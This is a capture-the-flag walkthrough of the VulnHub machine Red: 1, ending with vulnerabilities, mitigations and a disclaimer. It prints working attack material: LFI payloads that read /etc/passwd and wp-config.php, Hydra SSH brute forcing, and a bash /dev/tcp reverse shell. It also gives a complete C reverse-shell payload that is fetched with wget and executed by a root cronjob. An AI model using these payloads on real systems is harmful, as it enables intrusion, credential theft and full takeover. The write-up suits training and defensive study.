# Red: 1 CTF Walkthrough

**Target:** Red: 1  
**Source:** [VulnHub](https://www.vulnhub.com/entry/red-1,753/)  
**Difficulty:** Intermediate  
**Target IP:** 10.0.2.21  
**Note:** Add `10.0.2.21 redrocks.win` to your `/etc/hosts` file

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Application Analysis](#web-application-analysis)
- [LFI Exploitation](#lfi-exploitation)
- [Initial Access - SSH Brute Force](#initial-access---ssh-brute-force)
- [Post-Exploitation](#post-exploitation)
- [Privilege Escalation via Reverse Shell](#privilege-escalation-via-reverse-shell)
- [Root Access - Cronjob Exploitation](#root-access---cronjob-exploitation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Recommendations](#recommendations)

---

## Overview

Red: 1 is an intermediate-difficulty CTF challenge themed around a red team adversary who has already compromised the system. The attacker has left backdoors, cronjobs, and traps. The goal is to regain control and capture the root flag.

**Key Skills Required:**
- Web application enumeration
- LFI (Local File Inclusion) exploitation
- PHP filter wrappers
- Password mutation with Hashcat rules
- SSH brute forcing with Hydra
- Linux privilege escalation via sudo
- Reverse shell techniques
- Cronjob-based code execution

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -Pn -sC 10.0.2.21
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | http | Apache httpd 2.4.41 |

**Key Observations:**
- WordPress 5.8.1 detected (`http-generator` header)
- Page title confirms compromise: `Hacked By Red`
- `robots.txt` reveals `/wp-admin/` is disallowed

### Robots.txt Inspection

```bash
curl http://10.0.2.21/robots.txt
```

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://redrocks.win/wp-sitemap.xml
```

---

## Web Application Analysis

### Directory Enumeration for PHP Backdoors

Using a PHP backdoor-specific wordlist to find any webshells Red may have planted:

```bash
locate CommonBackdoors
# /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt

gobuster dir -u http://10.0.2.21/ \
  -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt
```

**Result:**

```
NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```

A known PHP webshell was found. Searching GitHub reveals its source:  
[https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php](https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php)

This is a file manager backdoor used here as an **LFI (Local File Inclusion)** vector.

---

## LFI Exploitation

### Finding the LFI Parameter

Using `wfuzz` with an LFI parameter wordlist to identify the vulnerable GET parameter:

```bash
# Wordlist: https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt

wfuzz -u "http://10.0.2.21/NetworkFileManagerPHP.php?FUZZ=/etc/passwd" \
  -w fuzz-lfi-params-list.txt --hw 0
```

**Result:**

```
000000027:   200    38 L    53 W    1966 W    "key"
```

The vulnerable parameter is `key`.

### Reading System Files

```bash
curl http://redrocks.win/NetworkFileManagerPHP.php?key=../../../etc/passwd
```

**Interesting users discovered in `/etc/passwd`:**
- `john` (uid 1000) — has `/bin/bash` shell
- `ippsec` (uid 1001) — has `/bin/bash` shell
- `oxdf` (uid 1002) — has `/bin/bash` shell

### Extracting wp-config.php via PHP Filter Wrapper

Using the `php://filter` wrapper to read PHP source files without execution:

```bash
curl "http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php" \
  > wpc_base64.txt

base64 -d wpc_base64.txt
```

**Credentials discovered in `wp-config.php`:**

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'john' );
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
define( 'DB_HOST', 'localhost' );
```

### Reading the Backdoor Source

```bash
curl "http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php" \
  > nfm_base64.txt

base64 -d nfm_base64.txt
```

**Decoded output:**

```php
<?php
   $file = $_GET['key'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("NetworkFileManagerPHP.php");
   }
   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
?>
```

**Decoding the hidden base64 comment:**

```bash
echo "VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw==" | base64 -d
```

> `That password alone won't help you! Hashcat says rules are rules`

This is a critical hint — the `wp-config.php` password must be **mutated using Hashcat rules**.

---

## Initial Access - SSH Brute Force

### Generating a Mutated Password Wordlist

```bash
echo 'R3v_m4lwh3r3_k1nG!!' > passwd.txt

hashcat --force passwd.txt -r /usr/share/hashcat/rules/best66.rule --stdout > wordlist.txt
```

This generates 66 password mutations based on the base password.

### SSH Brute Force with Hydra

```bash
hydra -l john -P wordlist.txt 10.0.2.21 ssh
```

**Result:**

```
[22][ssh] host: 10.0.2.21   login: john   password: R3v_m4lwh3r3_k1nG!!21
```

> **Warning:** Red has set up a defense mechanism — once you log in, you are kicked out after a short time and the password changes. Run Hydra again to get the next valid password.

```bash
hydra -l john -P wordlist.txt 10.0.2.21 ssh
# [22][ssh] host: 10.0.2.21   login: john   password: r3v_m4lwh3r3_k1nG!!
```

### SSH Login as john

```bash
ssh john@10.0.2.21
```

```
john@red:~$ whoami
john
john@red:~$ ls
note_from_red.txt
john@red:~$ head note_from_red.txt
Having a little trouble with the cat command blue?
```

> **Note:** Red has tampered with the `cat` command — use `head` instead.

---

## Post-Exploitation

### Sudo Enumeration

```bash
john@red:~$ sudo -l
```

```
User john may run the following commands on red:
    (ippsec) NOPASSWD: /usr/bin/time
```

### Lateral Movement to ippsec

The `time` binary can be abused via GTFOBins to spawn a shell as another user:

```bash
john@red:~$ sudo -u ippsec /usr/bin/time /bin/bash
ippsec@red:/home/john$ whoami
ippsec
```

### ippsec's Home Directory

```bash
ippsec@red:~$ ls
user.txt
ippsec@red:~$ head user.txt
Fake Flag:
Come on now Blue! You really think it would be that easy to get the user flag? You are not even on the right user! Hahaha
```

This is a decoy — we need to go deeper.

---

## Privilege Escalation via Reverse Shell

Since the password changes every few minutes, we need a persistent shell. We'll create a reverse shell script to maintain access.

### Setup Persistent Reverse Shell

```bash
# On the target, create reverse shell script
cd /dev/shm
nano shell.sh
```

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.2.6/4444 0>&1
```

```bash
chmod +x shell.sh
```

**Start Netcat listener on attacker machine:**

```bash
rlwrap nc -nvlp 4444
```

**Execute the script:**

```bash
bash shell.sh
```

**Connection received:**

```
listening on [any] 4444 ...
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.21] 54750
ippsec@red:/dev/shm$
```

**Stabilize the shell:**

```bash
export TERM=xterm
```

### Exploring the WordPress Directory

```bash
cd /var/www/wordpress
ls -la
```

```
drwxrwx---  2 root     ippsec    4096 May  4 15:22 .git    <- Important!
```

The `.git` directory is writable by `ippsec`. Let's investigate:

```bash
cd .git
ls
# rev  supersecretfileuc.c
```

**Reading the C file (reversed — Red used `tac` to obfuscate):**

```bash
tac supersecretfileuc.c
```

```c
#include <stdio.h>

int main()
{
    // prints hello world
    printf("Get out of here Blue!\n");

    return 0;
}
```

This is a placeholder. The real exploit: **Red has a cronjob running that compiles and executes whatever C file is placed in `.git/`.**

---

## Root Access - Cronjob Exploitation

### Strategy

Red's defense/attack system uses a cronjob that monitors the `.git` directory. We can replace the C file with a **reverse shell payload** that will be compiled and executed automatically with root privileges.

### Step 1: Remove Red's Files

```bash
ippsec@red:/var/www/wordpress/.git$ rm -rf supersecretfileuc.c
ippsec@red:/var/www/wordpress/.git$ rm -r rev
```

### Step 2: Create Malicious C Reverse Shell

On the **attacker machine**, create the payload:

```bash
nano supersecretfileuc.c
```

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
   int port = 9001;
   struct sockaddr_in revsockaddr;

   int sockt = socket(AF_INET, SOCK_STREAM, 0);
   revsockaddr.sin_family = AF_INET;
   revsockaddr.sin_port = htons(port);
   revsockaddr.sin_addr.s_addr = inet_addr("10.0.2.6");

   connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
   dup2(sockt, 0);
   dup2(sockt, 1);
   dup2(sockt, 2);

   char * const argv[] = {"/bin/bash", NULL};
   execve("/bin/bash", argv, NULL);

   return 0;
}
```

### Step 3: Upload the Payload

Host a Python HTTP server on the attacker machine:

```bash
python3 -m http.server --bind=10.0.2.6 8001
```

Download the file to the target:

```bash
# From the ippsec reverse shell
wget http://10.0.2.6:8001/supersecretfileuc.c -P /var/www/wordpress/.git/
```

### Step 4: Start Root Listener

```bash
rlwrap nc -nvlp 9001
```

Wait for Red's cronjob to compile and execute the file automatically.

### Step 5: Root Shell Received

```
listening on [any] 9001 ...
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.21] 57492
whoami
root
```

### Root Flag

```bash
ls
# defense  root.txt  snap

head root.txt
# GG Blue, GG
```

### Red's Defense Directory

```bash
cd defense
ls
# backdoor.sh  change_pass.sh  kill_sess.sh  talk.sh
```

These were the scripts Red used to fight back:
- `backdoor.sh` — the backdoor setup
- `change_pass.sh` — changes john's password periodically
- `kill_sess.sh` — kills active SSH sessions
- `talk.sh` — sends taunting messages

**PWNED!** 

---

## Flags

| Flag | Location | Notes |
|------|----------|-------|
| User (Fake) | `/home/ippsec/user.txt` | Decoy flag — not the real one |
| Root | `/root/root.txt` | `GG Blue, GG` |

---

## Vulnerabilities

### 1. Exposed PHP Webshell / Backdoor (Critical)

**Description:** Red planted `NetworkFileManagerPHP.php` — a known PHP webshell — in the web root, which enabled LFI.

**Impact:** Full read access to the server filesystem including sensitive configuration files.

**Mitigation:**
- Regularly audit web root for unauthorized files
- Implement file integrity monitoring (FIM)
- Use WAF to block known webshell signatures

---

### 2. Local File Inclusion via PHP Wrapper (Critical)

**Description:** The backdoor directly passed user-supplied GET parameters to `include()` without sanitization.

**Vulnerable Code:**
```php
$file = $_GET['key'];
include("$file");
```

**Impact:** Attackers could read arbitrary files, including `wp-config.php` with database credentials.

**Mitigation:**
- Never pass user input directly to `include()` or `require()`
- Use allowlists for permitted file paths
- Disable dangerous PHP wrappers via `php.ini`:
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

---

### 3. Credentials in wp-config.php Reused for SSH (High)

**Description:** The database password in `wp-config.php` was (with mutation) also valid as an SSH password.

**Impact:** Initial SSH access obtained via password reuse.

**Mitigation:**
- Never reuse credentials across services
- Use unique, randomly generated passwords per service
- Restrict SSH to key-based authentication only:
  ```
  PasswordAuthentication no
  ```

---

### 4. Sudo Misconfiguration - `time` Binary (High)

**Description:** `john` could run `/usr/bin/time` as `ippsec` without a password.

**Impact:** Privilege escalation from `john` to `ippsec` using GTFOBins technique.

**Mitigation:**
- Never grant `NOPASSWD` sudo without strict necessity
- Avoid granting sudo access to binaries that can spawn shells
- Regularly audit `/etc/sudoers` and `sudo -l` for all users

---

### 5. World-Writable .git Directory with Privileged Cronjob (Critical)

**Description:** The `.git` directory under the WordPress installation was writable by `ippsec`, and a root-level cronjob compiled and executed C files placed there.

**Impact:** Full privilege escalation to root by replacing the C source file with a reverse shell.

**Mitigation:**
- Never grant write access to directories monitored by privileged cronjobs
- Verify cronjob permissions with principle of least privilege
- Monitor `.git` and other sensitive directories with file integrity tools

---

## Recommendations

### Authentication & Access Control

- Disable SSH password authentication; enforce key-based auth
- Implement fail2ban to block repeated SSH login attempts
- Enforce password uniqueness across all services
- Audit `sudo` configurations regularly — run `sudo -l` for every user

### Web Server Hardening

- Audit web root for unauthorized or suspicious PHP files
- Implement a Web Application Firewall (WAF)
- Restrict PHP dangerous functions in `php.ini`:
  ```ini
  disable_functions = system,exec,shell_exec,passthru,proc_open,popen
  allow_url_include = Off
  ```
- Never expose WordPress `wp-config.php` to LFI vectors

### Filesystem & Cronjob Security

- Restrict write permissions on directories used by cronjobs
- Audit all cron entries: `crontab -l` and `/etc/cron*`
- Implement file integrity monitoring (AIDE, Tripwire) on critical paths
- Log all cronjob executions

### Incident Response

Red had implemented a multi-layered defense against Blue team access:

| Script | Purpose |
|--------|---------|
| `change_pass.sh` | Rotates john's SSH password periodically |
| `kill_sess.sh` | Terminates active SSH sessions |
| `backdoor.sh` | Maintains attacker persistence |
| `talk.sh` | Sends taunting messages to terminal |

**Lessons learned:**
- Always establish persistence (reverse shell) before exploring, since credentials may change
- Look for writable directories owned by root or used in automated tasks
- Check `/dev/shm` for temporary script storage during engagements

---

## Attack Chain Summary

```
Port Scan (Nmap)
    ↓
Gobuster — PHP Backdoor Wordlist
    ↓
NetworkFileManagerPHP.php Discovered
    ↓
LFI Parameter Fuzzing (wfuzz)
    ↓
/etc/passwd Read → Users: john, ippsec, oxdf
    ↓
wp-config.php Extracted via PHP Filter Wrapper
    ↓
Database Credentials Obtained (john / R3v_m4lwh3r3_k1nG!!)
    ↓
Hidden Base64 Hint Decoded → "Hashcat says rules are rules"
    ↓
Password Mutation via Hashcat (best66.rule)
    ↓
SSH Brute Force with Hydra → john SSH Access
    ↓
Sudo Enumeration → (ippsec) NOPASSWD: /usr/bin/time
    ↓
Lateral Movement to ippsec via GTFOBins
    ↓
Decoy user.txt Found (ippsec)
    ↓
Persistent Reverse Shell Established (/dev/shm/shell.sh)
    ↓
.git Directory Discovered (writable by ippsec)
    ↓
Red's C File Replaced with Reverse Shell Payload
    ↓
Malicious File Uploaded via Python HTTP Server
    ↓
Root Cronjob Compiles and Executes Payload
    ↓
Root Shell Obtained
    ↓
root.txt Captured — SYSTEM PWNED
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network & service scanning |
| Gobuster | Directory & backdoor enumeration |
| wfuzz | LFI parameter fuzzing |
| curl | HTTP requests & file retrieval |
| Hashcat | Password mutation with rules |
| Hydra | SSH brute force |
| Netcat (rlwrap nc) | Reverse shell listener |
| Python3 HTTP Server | File hosting for upload |

---

## References

- [VulnHub - Red: 1](https://www.vulnhub.com/entry/red-1,753/)
- [NetworkFileManagerPHP.php Source](https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php)
- [PayloadsAllTheThings - LFI Wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md)
- [GTFOBins - time](https://gtfobins.github.io/gtfobins/time/)
- [Hashcat Rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [OWASP - LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

---

## Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

---
*"Know your enemy — and know how they got in."*
